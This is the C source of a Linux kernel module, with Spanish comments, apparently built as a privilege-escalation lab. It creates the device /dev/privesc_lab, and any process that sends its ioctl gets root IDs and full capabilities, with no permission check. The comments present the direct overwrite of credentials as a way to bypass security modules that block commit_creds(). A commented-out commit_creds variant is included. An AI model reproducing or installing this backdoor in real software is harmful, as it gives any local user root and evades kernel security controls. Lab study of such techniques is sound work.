#include <linux/module.h>
#include <linux/kernel.h> 
#include <linux/fs.h> 
#include <linux/cdev.h>
#include <linux/device.h> 
#include <linux/ioctl.h>
#include <linux/cred.h>
#include <linux/capability.h>
#include <linux/slab.h>

#include "privesc_ioctl.h"

#define DEVICE_NAME "privesc_lab"
#define CLASS_NAME  "privesc"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tu Nombre");
MODULE_DESCRIPTION("Módulo de laboratorio para escalada de privilegios");
MODULE_VERSION("1.0");

static dev_t dev_number;
static struct class *privesc_class;
static struct device *privesc_device;
static struct cdev privesc_cdev;

// Función de escalada con TÉCNICA DIRECTA (más agresiva)
static long privesc_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct cred *creds;
    
    if (cmd != PRIVESC_CALL) {
        pr_err("Comando ioctl invalido: %u\n", cmd);
        return -EINVAL;
    }
    
    pr_info("Escalando privilegios para PID %d (antes UID=%d, GID=%d)\n", 
            current->pid, current->cred->uid.val, current->cred->gid.val);
    
    /*
     * TÉCNICA DIRECTA: Modificar credenciales sin prepare_creds/commit_creds
     * 
     * VENTAJAS:
     * - Bypass de LSMs que bloquean commit_creds()
     * - Más simple y directo
     * 
     * DESVENTAJAS:
     * - No es thread-safe
     * - Puede violar RCU
     * - Riesgo de corrupción si hay múltiples referencias
     */
    creds = (struct cred *)current->cred;
    
    // Establecer todos los UIDs/GIDs a 0 (root)
    creds->uid.val    = 0;
    creds->gid.val    = 0;
    creds->euid.val   = 0;
    creds->egid.val   = 0;
    creds->suid.val   = 0;
    creds->sgid.val   = 0;
    creds->fsuid.val  = 0;
    creds->fsgid.val  = 0;
    
    // Capacidades completas
    creds->cap_inheritable = CAP_FULL_SET;
    creds->cap_permitted   = CAP_FULL_SET;
    creds->cap_effective   = CAP_FULL_SET;
    creds->cap_bset        = CAP_FULL_SET;
    
    pr_info("PID %d ahora tiene UID=%d, GID=%d (root)\n", 
            current->pid, current->cred->uid.val, current->cred->gid.val);
    
    return 0;
}

// ALTERNATIVA: Técnica "segura" con prepare_creds/commit_creds
/*
static long privesc_ioctl_safe(struct file *file, unsigned int cmd, unsigned long arg) {
    struct cred *new_creds;
    
    if (cmd != PRIVESC_CALL)
        return -EINVAL;
    
    new_creds = prepare_creds();
    if (!new_creds)
        return -ENOMEM;
    
    new_creds->uid.val = 0;
    new_creds->gid.val = 0;
    new_creds->euid.val = 0;
    new_creds->egid.val = 0;
    new_creds->suid.val = 0;
    new_creds->sgid.val = 0;
    new_creds->fsuid.val = 0;
    new_creds->fsgid.val = 0;
    
    new_creds->cap_inheritable = CAP_FULL_SET;
    new_creds->cap_permitted = CAP_FULL_SET;
    new_creds->cap_effective = CAP_FULL_SET;
    new_creds->cap_bset = CAP_FULL_SET;
    
    commit_creds(new_creds);
    return 0;
}
*/

static int dev_open(struct inode *inodep, struct file *filep) {
    pr_info("Dispositivo abierto por PID %d (UID=%d)\n", 
            current->pid, current->cred->uid.val);
    return 0;
}

static int dev_release(struct inode *inodep, struct file *filep) {
    pr_info("Dispositivo cerrado por PID %d (UID=%d)\n", 
            current->pid, current->cred->uid.val);
    return 0;
}

static const struct file_operations fops = {
    .owner          = THIS_MODULE,
    .open           = dev_open,
    .release        = dev_release,
    .unlocked_ioctl = privesc_ioctl,
};

static int __init privesc_init(void) {
    int ret;
    
    pr_info("Inicializando módulo privesc_lab (técnica directa)\n");
    
    ret = alloc_chrdev_region(&dev_number, 0, 1, DEVICE_NAME);
    if (ret < 0) {
        pr_err("No se pudo registrar el dispositivo\n");
        return ret;
    }
    pr_info("Número mayor asignado: %d\n", MAJOR(dev_number));
    
    privesc_class = class_create(CLASS_NAME);
    if (IS_ERR(privesc_class)) {
        pr_err("No se pudo crear la clase\n");
        unregister_chrdev_region(dev_number, 1);
        return PTR_ERR(privesc_class);
    }
    
    privesc_device = device_create(privesc_class, NULL, dev_number, NULL, DEVICE_NAME);
    if (IS_ERR(privesc_device)) {
        pr_err("No se pudo crear el dispositivo\n");
        class_destroy(privesc_class);
        unregister_chrdev_region(dev_number, 1);
        return PTR_ERR(privesc_device);
    }
    
    cdev_init(&privesc_cdev, &fops);
    privesc_cdev.owner = THIS_MODULE;
    
    ret = cdev_add(&privesc_cdev, dev_number, 1);
    if (ret < 0) {
        pr_err("No se pudo agregar el cdev\n");
        device_destroy(privesc_class, dev_number);
        class_destroy(privesc_class);
        unregister_chrdev_region(dev_number, 1);
        return ret;
    }
    
    pr_info("Dispositivo /dev/%s creado exitosamente\n", DEVICE_NAME);
    return 0;
}

static void __exit privesc_exit(void) {
    pr_info("Limpiando módulo privesc_lab\n");
    
    cdev_del(&privesc_cdev);
    device_destroy(privesc_class, dev_number);
    class_destroy(privesc_class);
    unregister_chrdev_region(dev_number, 1);
    
    pr_info("Módulo descargado exitosamente\n");
}

module_init(privesc_init);
module_exit(privesc_exit);